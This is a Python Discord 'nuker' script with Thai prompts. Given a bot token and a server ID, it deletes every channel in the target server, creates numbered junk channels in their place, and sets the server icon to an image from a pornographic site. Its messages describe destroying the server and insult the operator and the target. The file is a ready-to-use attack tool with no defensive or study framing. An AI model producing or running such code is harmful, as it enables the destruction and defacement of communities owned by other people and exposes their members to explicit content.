import discord
import asyncio
import sys
import aiohttp
import os
import time

RED = "\033[91m"
RESET = "\033[0m"

def splash():
    os.system("clear")
    print(RED)
    print("        ███████╗ ███████╗ ███████╗")
    print("        ██╔════╝ ╚══███╔╝ ╚══███╔╝")
    print("        █████╗     ███╔╝     ███╔╝ ")
    print("        ██╔══╝    ███╔╝     ███╔╝  ")
    print("        ██║      ███████╗ ███████╗")
    print("        ╚═╝      ╚══════╝ ╚══════╝")
    print("\n")
    print("     ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐ ┌─┐")
    print("     │■│ │■│ │■│ │■│ │■│ │■│")
    print("     └─┘ └─┘ └─┘ └─┘ └─┘ └─┘")
    print(RESET)
    time.sleep(1)

def loading_bar(duration=3, length=30):
    print("\nกำลังเตรียมระบบ...\n")
    for i in range(length + 1):
        percent = int((i / length) * 100)
        bar = "█" * i + "░" * (length - i)
        sys.stdout.write(f"\r[{bar}] {percent}%")
        sys.stdout.flush()
        time.sleep(duration / length)
    print("\n\nพร้อมใช้งาน\n")
    time.sleep(0.5)

splash()
loading_bar()


# ====== ตั้งค่าตรงนี้ ======
SERVER_ICON_URL = "https://api-cdn.rule34.xxx/images/1051/b7b96cef649b08a122ddf0ef849ee>
DELAY = 0.50  # หน่วงเวลา (วินาที)
# ==========================

TOKEN = input("ใส่ TOKEN บอท: ").strip()
if not TOKEN:
    print("TOKEN ว่าง"); sys.exit(0)

try:
    GUILD_ID = int(input("ใส่ Server ID: ").strip())
except:
    print("Server ID ไม่ถูกต้อง"); sys.exit(0)

CONFIRM = input("พิมพ์ y เพื่อยืนยัน: ").strip()
if CONFIRM != "y":
    print("ยกเลิก")
    sys.exit(0)

intents = discord.Intents.default()
intents.guilds = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    guild = client.get_guild(GUILD_ID)
    if not guild:
        print("ไม่พบบอทในเซิร์ฟนี้ไอ้ควายโง่เอาบอทเข้าก่อนไช้ดิ")
        await client.close()
        return

    print(f"เริ่มทำลายล้างเซิฟร์: {guild.name}")

    channels = list(guild.channels)
    total = len(channels)
    print(f"พบ {total} ช่อง กำลังลบ...")
  
    # ลบช่องทั้งหมด
    for ch in channels:
        try:
            await ch.delete(reason="Full reset")
            print("ลบ:", ch.name)
            await asyncio.sleep(DELAY)
        except Exception as e:
            print("ข้าม:", ch.name, e)

    # สร้างช่องใหม่ตามจำนวนเดิม
    print("กำลังสร้างช่ิงไห้หัวดิสแม่งลบ")
    for i in range(1, total + 1):
        try:
            await guild.create_text_channel(f"{i}bot", reason="Full reset")
            print("สร้าง:", f"{i}bot")
            await asyncio.sleep(DELAY)
        except Exception as e:
            print("สร้างไม่ได้:", e)

    # เปลี่ยนรูปโปรไฟล์เซิร์ฟ
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(SERVER_ICON_URL) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    await guild.edit(icon=data, reason="Full reset")
                    print("เปลี่ยนรูปเซิฟร์กระจอกๆละ")
                else:
                    print("โหลดรูปไม่ได้วะ")
    except Exception as e:
        print("เปลี่ยนรูปไม่ได้วะน่าจะไม่มีสิญไม่ก็ผิดพลาด:", e)

    print("ทำลายเสร็จละไอ้ควาย")
    await client.close()

client.run(TOKEN)
